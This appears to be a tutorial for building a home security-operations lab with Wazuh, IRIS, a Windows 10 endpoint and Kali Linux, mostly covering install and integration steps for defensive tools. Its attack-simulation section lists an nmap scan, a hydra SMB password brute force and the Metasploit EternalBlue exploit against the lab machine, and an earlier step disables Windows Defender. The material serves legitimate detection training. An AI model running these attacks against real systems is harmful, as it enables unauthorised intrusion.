Table of Contents
Introduction

Lab Overview

Prerequisites

VirtualBox Setup

Ubuntu Server Installation (Wazuh & IRIS)

Windows 10 Machine Setup

Kali Linux Setup (Attack Simulation)

Wazuh Installation & Configuration

IRIS Incident Response Platform Setup

Integrating Wazuh with IRIS via API

Attack Simulation & Alert Monitoring

Future Enhancements

Conclusion

References

1. Introduction
This documentation provides a step-by-step guide to building a fully functional Security Operations Center (SOC) Lab using VirtualBox, Wazuh (SIEM), IRIS (Incident Response Platform), Windows 10 (Endpoint), and Kali Linux (Attack Simulation).

Objectives
Monitor security events using Wazuh SIEM

Automate incident response with IRIS

Simulate attacks using Kali Linux

Test detection and response capabilities

Establish a foundation for future SOC enhancements

2. Lab Overview
Component	Role
VirtualBox	Hypervisor for running virtual machines
Ubuntu (Wazuh)	Hosts Wazuh SIEM for threat detection
Ubuntu (IRIS)	Runs IRIS Incident Response Platform
Windows 10	Test endpoint with Wazuh Agent
Kali Linux	Attack simulation platform

3. Prerequisites
Before starting, ensure you have:

VirtualBox installed

Minimum 8GB RAM (recommended)

Ubuntu Server 22.04 LTS ISO

Windows 10 ISO

Kali Linux ISO

Stable internet connection

4. VirtualBox Setup
4.1 Creating Virtual Machines
VM		OS Type		RAM	Storage		Network
Wazuh Server	Ubuntu 64-bit	4GB	50GB	Bridged Adapter/only-host net
IRIS Server	Ubuntu 64-bit	4GB	50GB	Bridged Adapter /only-host net
Windows 10	Windows 64-bit	4GB	60GB	Bridged Adapter/only-host net
Kali Linux	Debian 64-bit	2GB	30GB	Bridged Adapter/only-host net


5. Ubuntu Server Installation
5.1 Base Installation
Boot from Ubuntu Server ISO

Set static IP for both servers

5.2 Post-Installation Setup
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y openssh-server net-tools curl wget
```
6. Windows 10 Machine Setup
Install Windows 10

Install VirtualBox Guest Additions

Disable Windows Defender for testing

Install Wazuh Agent (see Section 8)

7. Kali Linux Setup
Install Kali Linux

Update system:
```bash
sudo apt update && sudo apt upgrade -y
```
Install tools:
```bash
sudo apt install -y metasploit-framework nmap hydra
```
8. Wazuh Installation
8.1 Server Installation
```bash
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && sudo chmod 644 /usr/share/keyrings/wazuh.gpg
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee -a /etc/apt/sources.list.d/wazuh.list
sudo apt update
sudo apt install -y wazuh-manager
sudo systemctl enable --now wazuh-manager
```
8.2 Windows Agent Installation
```bash
.\wazuh-agent-4.7.2-1.msi /qn WAZUH_MANAGER="<Wazuh_Server_IP>" WAZUH_AGENT_GROUP="default" WAZUH_AGENT_NAME="Windows10-Agent"
net start WazuhSvc
```
9. IRIS Installation
```bash
sudo apt install -y docker.io docker-compose
sudo systemctl enable --now docker
git clone https://github.com/dfir-iris/iris-web
cd iris-web
docker-compose up -d
```
10. Wazuh-IRIS Integration
In IRIS Dashboard: Settings > Integrations > Wazuh

Enter Wazuh Manager IP and credentials

Enable alert forwarding (Level 4+) and connect the api using wazuh-IRIS integration libary 

Test connection

11. Attack Simulation
```bash
nmap -sV <Windows_IP>
hydra -l admin -P /usr/share/wordlists/rockyou.txt <Windows_IP> smb
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <Windows_IP>
exploit
```
11.2 Alert Monitoring
Check IRIS Dashboard: Alerts > Wazuh Alerts

Verify incident logs

12. Future Enhancements
Implement pfSense/OPNsense firewall

Deploy MISP threat intelligence platform

Install Security Onion for NSM

13. Conclusion
This lab provides a complete SOC environment for:

Threat detection (Wazuh)

Incident response (IRIS)

Attack simulation (Kali)

Endpoint monitoring (Windows)

14. References
Wazuh Documentation

IRIS GitHub

Kali Tools

VirtualBox Manual
